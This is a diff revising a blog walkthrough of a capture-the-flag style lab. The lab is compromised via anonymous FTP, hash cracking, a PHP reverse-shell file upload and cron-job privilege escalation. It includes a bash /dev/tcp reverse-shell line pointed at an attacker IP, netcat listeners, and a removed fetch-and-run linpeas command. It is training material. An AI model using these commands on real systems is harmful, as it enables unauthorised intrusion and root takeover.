@@ -68,28 +68,36 @@ The scan revealed the following open ports and services:
 
 <img src="/assets/images/tcm-academy/academy-02.png">
 
-From this, I identified two primary attack vectors to explore: the FTP service and the web server running on port 80.
+From this, I identified two primary attack vectors to explore: the FTP service running on port 21 and the web server running on port 80.
 
 ### FTP Enumeration
 
-I began by connecting to the FTP service on the target machine. To do this, I used the ftp command, followed by the target IP address. I used anonymous login since this option was enabled on the server.
+I began by connecting to the FTP server on the target machine. To do this, I used the ftp command, followed by the target IP address. I used anonymous login since this option was enabled on the server.
 
 ```bash
 ftp 192.168.17.136
 ls
 ```
 
-<img src="/assets/images/tcm-academy/academy-03.png">
+Once connected, I listed the contents of the current directory with the <strong>ls</strong> command. This revealed a file named note.txt in the present directory.
 
-
-Once connected, I listed the contents of the current directory with the ls command. This revealed a file named note.txt in the present directory.
 At this point, I downloaded the note.txt file to see if it contained any useful information for further exploitation:
+
 
 ```bash
 get note.txt
+```
+
+<img src="/assets/images/tcm-academy/academy-03.png">
+
+
+
+
+The note contained information about a student registration database, but more interestingly, it included a password hash. This hash seemed like it could be the key to accessing additional resources or gaining further control over the system.
+
+```bash
 cat note.txt
 ```
-The note contained information about a student registration database, but more interestingly, it included a password hash. This hash seemed like it could be the key to accessing additional resources or gaining further control over the system.
 
 <img src="/assets/images/tcm-academy/academy-04.png">
 
@@ -97,7 +105,7 @@ The note contained information about a student registration database, but more i
 <img src="/assets/images/tcm-academy/academy-05.png">
 
 
-To identify the hash type, I used the hash-identifier tool on Kali Linux:
+To identify the hash type, I used the hash-identifier tool on Kali Linux, which identified it as an md5 type hash:
 
 ```bash
 hash-identifier 
@@ -105,7 +113,7 @@ hash-identifier
 
 <img src="/assets/images/tcm-academy/academy-06.png">
 
-I saved the hash and used hashcat to crack it:
+I saved the hash to an acceptable format and used the Hashcat tool to crack it:
 
 ```bash
 gedit hashes.txt
@@ -158,10 +166,10 @@ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u htt
 
 <img src="/assets/images/tcm-academy/academy-11.png">
 
-The results revealed 301 redirects for two interesting paths: /phpmyadmin and /academy. These redirects suggested that these paths were actively being used on the server and could lead to further vulnerabilities or misconfigurations.
+The results revealed 301 redirects for two interesting paths: /phpmyadmin and /academy. These redirects suggested that these directories were actively being used on the server and could lead to further vulnerabilities or misconfigurations.
 Upon visiting http://192.168.17.136/academy, I found a login form requesting a student registration number and password:
 
-<img src="/assets/images/tcm-academy/academy-12.png">
+<img src="/assets/images/tcm-academy/academy-12-student.png">
 
 
 
@@ -170,11 +178,11 @@ Upon visiting http://192.168.17.136/academy, I found a login form requesting a s
 Using the previously obtained credentials, I successfully log into the academy student portal login page:
 
 
-<img src="/assets/images/tcm-academy/academy-12-student.png">
+<img src="/assets/images/tcm-academy/academy-12.png">
 
 ### Exploiting File Upload
 
-After successfully logging into the system, I explored the available options within the online course registration page. The "My Profile" page at http://192.168.17.136/academy/my-profile.php contained a photo upload form:
+After successfully logging into the target system, I explored the available options within the online course registration page. The "My Profile" page at http://192.168.17.136/academy/my-profile.php contained a photo upload form:
 
 <img src="/assets/images/tcm-academy/academy-13.png">
 
@@ -188,20 +196,26 @@ Testing confirmed uploads were stored at:
 I prepared a PHP reverse shell using the <a href="http://https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"> Pentest Monkey payload: 
 
 
+
 ```bash
 nano reverse-shell.php
 ```
 
-<img src="/assets/images/tcm-academy/academy-15.png">
+I updated the IP entry of the payload match the IP address configured to my Kali attack machine, 192.168.17.134 and I left the 1234 as the port for which I configured the same as the listening port on my Kali attack machine:
 
+
+<img src="/assets/images/tcm-academy/academy-15.png">
 
 <img src="/assets/images/tcm-academy/academy-16.png">
 
+
 Before uploading, I started a netcat listener on my Kali attack machine:
+
 
 ```bash
 nc -nvlp 1234
 ```
+
 
 <img src="/assets/images/tcm-academy/academy-17.png">
 
@@ -209,7 +223,7 @@ I then uploaded the PHP reverse shell through the photo upload form:
 
 <img src="/assets/images/tcm-academy/academy-18.png">
 
-The shell connected back immediately to my Kali machine and I was logged in to the target using the www-data user account, which did not have any elevated privileges:
+The shell immediately connected back to my Kali machine and I was logged in to the target using the www-data user account, which did not have any elevated privileges:
 
 <img src="/assets/images/tcm-academy/academy-19.png">
 
@@ -249,7 +263,7 @@ chmod +x linpeas.sh
 <img src="/assets/images/tcm-academy/academy-22.png">
 
 LINPEAS revealed several interesting findings:
-- A backup script in /home/grimmie
+- A backup script in /home/grimmie that was conifgured as a cron job
 - MySQL credentials
 - User "grimmie" with elevated privileges
 
@@ -267,7 +281,9 @@ LINPEAS revealed several interesting findings:
 
 <img src="/assets/images/tcm-academy/academy-27.png">
 
-Using the discovered credentials for SSH access, I am able to log into the target using the grimmie user account:
+
+Using the discovered credentials, I was able to SSH connect to the target using the grimmie user account:
+
 
 ```bash
 ssh grimmie@192.168.17.136
@@ -300,7 +316,7 @@ cat backup.sh
 
 <img src="/assets/images/tcm-academy/academy-30.png">
 
-The backup.sh script does the following:
+The backup.sh script does the following as a scheduled task:
 
 - Removes an existing backup.zip file in the /tmp directory.
 - Creates a backup.zip file containing the /var/www/html/academy/includes directory.
@@ -322,6 +338,7 @@ We can check for cron jobs using the following commands:
 crontab -l
 crontab -u root -l 
 crontab -e 
+systemctl list-timers
 ```
 The output here indicates that there are no cron jobs scheduled for grimmie or the root user. 
 
@@ -355,7 +372,8 @@ chmod +x pspy64
 
 <img src="/assets/images/tcm-academy/academy-36.png">
 
- Looking through the output of pspy, I found that the backup.sh script was indeed running. This confirmed that the script was scheduled to execute periodically. We were able to observe how often it was running—every minute.
+Pspy is pretty neat!  It gave me output of all the processes that are running on the machine. Looking at the provided output, I found that the backup.sh script was indeed running. This confirmed that the script was scheduled to execute periodically. We were able to observe how often it was running—every minute.
+
 At this point, I realized I could exploit this recurring task for further access.
 
 
@@ -382,7 +400,7 @@ I substituted 10.0.0.1 with my attacker IP address and added this to the backup.
 
 
 ```bash
-bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+bash -i >& /dev/tcp/192.168.17.134/8080 0>&1
 ```
 
 <img src="/assets/images/tcm-academy/academy-39-1.png">
@@ -390,7 +408,7 @@ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 
 <img src="/assets/images/tcm-academy/academy-39-2.png">
 
-Waiting for script execution to gain root:
+
 When the backup script executed, it gave me root access:
 
 <img src="/assets/images/tcm-academy/academy-40.png">
@@ -416,36 +434,12 @@ This walkthrough demonstrated a complete penetration testing workflow, from init
 - Password cracking
 - Web application security
 - File upload vulnerabilities
-- Linux privilege escalation techniques
+- Linux privilege escalation techniques (Cron job)
 
 Remember that the techniques demonstrated here should only be used in authorized testing environments. Always ensure you have proper permission before attempting any security testing.
 
-### Quick Reference Commands
 
-```bash
-# Initial Enumeration
-nmap -p- -A -T4 <IP>
-dirb http://<IP>
-ffuf -w /path/to/wordlist:FUZZ -u http://<IP>/FUZZ
 
-# Hash Cracking
-hash-identifier
-hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+Thank you for reading!
 
-# Privilege Escalation
-wget http://<IP>/linpeas.sh
-chmod +x linpeas.sh
-./linpeas.sh
-```
-
-### Tools Used
-- nmap: Network scanning
-- dirb/ffuf: Directory enumeration
-- hashcat: Password cracking
-- netcat: Reverse shell listener
-- LINPEAS: Privilege escalation enumeration
-- pspy: Process monitoring
-
-Happy Hacking!
-
-- Nisha
+- NotesByNisha
